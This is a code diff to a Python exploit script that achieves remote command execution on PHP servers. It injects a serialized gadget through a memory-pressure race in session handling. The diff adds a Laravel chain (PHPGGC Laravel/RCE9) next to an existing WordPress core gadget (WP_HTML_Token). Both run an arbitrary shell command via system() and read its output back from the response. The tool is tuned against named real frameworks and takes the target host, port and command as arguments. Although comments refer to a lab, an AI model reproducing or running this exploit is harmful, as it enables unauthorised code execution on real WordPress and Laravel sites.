@@ -58,8 +58,9 @@ P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
 P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
 H_MIN, H_MAX = 0, 28_000_000   # pressure bracket bounds (h + 4 fillers
                                # must fit below post_max_size)
-WP_MARKER: str | None = None   # set by exploit() in 'wordpress' chain
-                               # mode: success marker echoed by system()
+OUT_MARKER: str | None = None   # set by exploit() for output-based chains
+                               # (wordpress, laravel): success marker
+                               # echoed by system() from __destruct
 
 
 # ------------------------------------------------------------------ HTTP I/O
@@ -281,6 +282,13 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
         time.sleep(0.7)
         # tiny bio: only the '|' anchor the pad's key-scan ends on.
         lab.store_bio(sid, b"x")
+    elif lab.GADGET == "laravel":
+        # Same filecache geometry as the bare app - Laravel does not
+        # slash input, so the bio payload arrives raw - but the store
+        # goes through /bio with Laravel's CSRF round-trip.
+        carrier, _ = lab.carrier_hold(sid)
+        time.sleep(0.7)
+        lab.laravel_store_bio(sid, build_payload())
     else:
         carrier, _ = lab.carrier_hold(sid)
         time.sleep(0.7)
@@ -318,15 +326,24 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     res["decode_failed"] = b"Failed to decode" in body
     res["consumer_ok"] = bool(body)
 
-    if WP_MARKER:
+    if OUT_MARKER:
         # Output-based chain (system() from __destruct at shutdown):
         # the command output + marker are appended to THIS response, so
         # the consumer body itself is the positive signal - no shell
         # file exists anywhere in this mode.
-        if WP_MARKER.encode() in body:
-            tail = body.rsplit(b"</html>", 1)[-1]
-            res["output"] = tail.replace(WP_MARKER.encode(), b"",
-                                         1).strip().decode(errors="replace")
+        marker_at = body.find(OUT_MARKER.encode())
+        if marker_at >= 0:
+            # The command output is appended after the page's closing
+            # tag and BEFORE the marker; a framework may then render
+            # its own error page (Laravel appends a full HTML exception
+            # response AFTER the marker), so anchor on the last
+            # </html> that precedes the marker instead of the last one
+            # in the body (which lands inside that trailing page and
+            # yields an empty output).
+            html_end = body.rfind(b"</html>", 0, marker_at)
+            start = html_end + len(b"</html>") if html_end >= 0 else 0
+            res["output"] = body[start:marker_at].strip().decode(
+                errors="replace")
             res["hit"] = True
         else:
             res["hit"] = False
@@ -433,13 +450,13 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     lab.set_geometry("big")     # victim RSS must beat the apache master
     lab.HOST, lab.PORT = host, port
     lab.set_shell(lab.new_shell_name())   # per-run shell: no stale hits
-    global WP_MARKER, ACTIVE_FILLERS
+    global OUT_MARKER, ACTIVE_FILLERS
     if chain == "wordpress":
         # Real WordPress core gadget (WP_HTML_Token): its __destruct
         # runs "<command>;echo <marker>" via system(); the marker in
         # the consumer response is the positive signal. No shell file.
-        WP_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
-        lab.set_gadget("wordpress", f"{command};echo {WP_MARKER}")
+        OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
+        lab.set_gadget("wordpress", f"{command};echo {OUT_MARKER}")
         # shift LEN2 so the payload's structural tail starts exactly on a
         # FILLUNIT (5120B) header-line piece boundary - PHP would
         # otherwise truncate the multi-MB filename mid-payload (see
@@ -449,8 +466,16 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         # the landable band up to h in (32, 40): 8 fillers give a
         # 56MiB pressure range and an 8MiB-wide band (vs jitter ~2MiB).
         ACTIVE_FILLERS = 8
+    elif chain == "laravel":
+        # PHPGGC Laravel/RCE9 from the framework's own vendor tree:
+        # PendingBroadcast::__destruct -> system("<cmd>;echo <marker>"),
+        # marker in the consumer response. Same splice/bio geometry as
+        # the bare app (Laravel does not slash input).
+        OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
+        lab.set_gadget("laravel", f"{command};echo {OUT_MARKER}")
+        ACTIVE_FILLERS = N_FILLERS
     else:
-        WP_MARKER = None
+        OUT_MARKER = None
         lab.set_gadget("filecache")
         ACTIVE_FILLERS = N_FILLERS
     c_len = P_START + lab.L1 + 2
@@ -489,7 +514,11 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # overlapping), so steering on them thrashes the bracket. The
     # landing is stochastic anyway and the landable band is only
     # ~7MiB of h, so sample the whole plausible range uniformly.
-    uniform = chain == "wordpress"
+    # Laravel measures the same way (at one h both "early" and "late"
+    # occur across attempts: the reclaimable file-cache cushion jitters
+    # +-5MiB per attempt, wider than the bisection's h steps - a
+    # converged bracket just oscillates between the two signals).
+    uniform = chain in ("wordpress", "laravel")
 
     run_sid = lab.sid_new()   # reused by every attempt (see attempt())
 
@@ -555,13 +584,17 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                 hi = min(h_max, lo + MIN_W)
         # coarse bisection to find the zone, then sample the band
         if uniform:
-            # Observed landable zone (mem_limit 172m): h in ~[38M, 54M].
-            # Below it the write finishes uncrossed (nooom), above it the
-            # charge crosses during serialisation (early) or the filler
-            # push storms (noise) - sampling outside only wastes
-            # attempts.
-            h = random.randint(max(int(h_min), 38_000_000),
-                               min(int(h_max), 54_000_000))
+            # Observed landable zones: WordPress (mem_limit 172m) h in
+            # ~[38M, 54M]; Laravel (mem_limit 112m) h in ~[6M, 18M]
+            # (below it the write finishes uncrossed - nooom; above it
+            # the charge crosses during the parse surge - early).
+            # Sampling outside only wastes attempts.
+            if chain == "wordpress":
+                zone = (38_000_000, 54_000_000)
+            else:
+                zone = (6_000_000, 18_000_000)
+            h = random.randint(max(int(h_min), zone[0]),
+                               min(int(h_max), zone[1]))
         elif hi - lo >= MIN_W * 2:
             h = (lo + hi) // 2
         else:
@@ -585,10 +618,11 @@ def main() -> int:
                    help="shell command to run on the target")
     p.add_argument("--attempts", type=int, default=40,
                    help="maximum interruption attempts (default 40)")
-    p.add_argument("--chain", choices=("filecache", "wordpress"),
+    p.add_argument("--chain", choices=("filecache", "wordpress", "laravel"),
                    default="filecache",
-                   help="planted gadget: the lab's FileCache (default) "
-                        "or the real WordPress core chain (WP_HTML_Token)")
+                   help="planted gadget: the lab's FileCache (default), "
+                        "WordPress core (WP_HTML_Token) or Laravel's own "
+                        "vendor tree (PHPGGC Laravel/RCE9)")
     p.add_argument("-q", "--quiet", action="store_true")
     a = p.parse_args()
 
